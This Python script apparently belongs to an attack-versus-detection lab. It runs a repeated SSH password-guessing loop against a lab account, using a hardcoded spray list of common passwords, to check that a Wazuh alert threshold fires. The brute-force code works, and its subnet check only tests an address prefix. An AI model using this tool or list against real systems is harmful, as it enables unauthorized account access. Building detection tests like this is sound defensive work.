#!/usr/bin/env python3
"""
Scenario: INC-001 - Controlled Authentication Brute Force Simulation
MITRE ATT&CK: T1110.001 - Password Guessing
Target: lab-ubuntu (192.168.56.30) / lab-win11 (192.168.56.20)
Purpose: Generates a deterministic sequence of failed authentication attempts
         against a dedicated lab account to validate SIEM threshold detection.
Safety Notice: Confined strictly to the isolated laboratory subnet (192.168.56.0/24).
"""

import argparse
import socket
import sys
import time
from datetime import datetime

# Controlled password spray list (deterministic artifacts)
LAB_PASSWORDS = [
    "Winter2024!", "Password123!", "Admin2024!", "LabTest#1", "Security!99",
    "Welcome2024!", "Secret#2024", "Summer2024!", "Football123!", "Dragon#2024",
    "Master2024!", "AlphaBravo1!", "Charlie2024!", "DeltaEcho#1", "FinalGuess2024!"
]

def parse_args():
    parser = argparse.ArgumentParser(description="INC-001 Controlled Authentication Brute Force Simulator")
    parser.add_argument("--target", default="192.168.56.30", help="Target IP address (default: 192.168.56.30)")
    parser.add_argument("--port", type=int, default=22, help="Target Port (default: 22 for SSH)")
    parser.add_argument("--username", default="lab-target", help="Target Username (default: lab-target)")
    parser.add_argument("--attempts", type=int, default=12, help="Number of failed attempts to simulate (default: 12)")
    parser.add_argument("--delay", type=float, default=1.5, help="Delay between attempts in seconds (default: 1.5s)")
    return parser.parse_args()

def simulate_ssh_auth_failure(target, port, username, password):
    """
    Simulates an SSH authentication attempt using direct socket protocol banner exchange
    or paramiko/sshpass if available, falling back to a raw handshake attempt.
    """
    try:
        import paramiko
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        try:
            client.connect(target, port=port, username=username, password=password, timeout=3, allow_agent=False, look_for_keys=False)
            client.close()
            return True # Success
        except paramiko.AuthenticationException:
            return False # Expected Failure
        except Exception as e:
            return False
    except ImportError:
        # Fallback: Raw socket handshake simulating connection burst
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(2.0)
        s.connect((target, port))
        banner = s.recv(1024)
        # Send raw client SSH identification
        s.sendall(b"SSH-2.0-DetectLab_Adversary_Simulation_T1110\r\n")
        time.sleep(0.1)
        s.close()
        return False

def main():
    args = parse_args()

    # Safety guard: Ensure target is within the lab subnet
    if not args.target.startswith("192.168.56."):
        print(f"[!] SAFETY ERROR: Target {args.target} is outside authorized lab subnet (192.168.56.0/24). Aborting.")
        sys.exit(1)

    print("==================================================================")
    print("   ATTACK vs DETECTION LAB -- INC-001 Brute Force Simulation     ")
    print("==================================================================")
    print(f"Adversary Station   : 192.168.56.10 (Kali Linux)")
    print(f"Target System       : {args.target}:{args.port}")
    print(f"Target Account      : {args.username}")
    print(f"Planned Attempts    : {args.attempts}")
    print(f"Burst Delay         : {args.delay}s per attempt")
    print(f"Start Timestamp     : {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    print("==================================================================\n")

    start_time = time.time()
    failure_count = 0

    for i in range(1, args.attempts + 1):
        pwd = LAB_PASSWORDS[(i - 1) % len(LAB_PASSWORDS)]
        ts = datetime.now().strftime("%H:%M:%S")
        print(f"[{ts}] [Attempt {i:02d}/{args.attempts:02d}] Testing user='{args.username}' password='{pwd}'...", end="", flush=True)

        success = simulate_ssh_auth_failure(args.target, args.port, args.username, pwd)
        if not success:
            failure_count += 1
            print(" -> FAILED (Expected: Event Generated)")
        else:
            print(" -> SUCCESS (Unexpected)")

        if i < args.attempts:
            time.sleep(args.delay)

    total_duration = round(time.time() - start_time, 2)

    print("\n======================= SIMULATION SUMMARY =======================")
    print(f"Total Attempts Executed : {args.attempts}")
    print(f"Authentication Failures : {failure_count}")
    print(f"Elapsed Time            : {total_duration} seconds")
    print(f"Average Rate            : {round(failure_count / total_duration, 2)} attempts/sec")
    print("Expected Detection      : Wazuh Rule 100001 (Threshold: >=10 in 60s)")
    print("==================================================================\n")

if __name__ == "__main__":
    main()
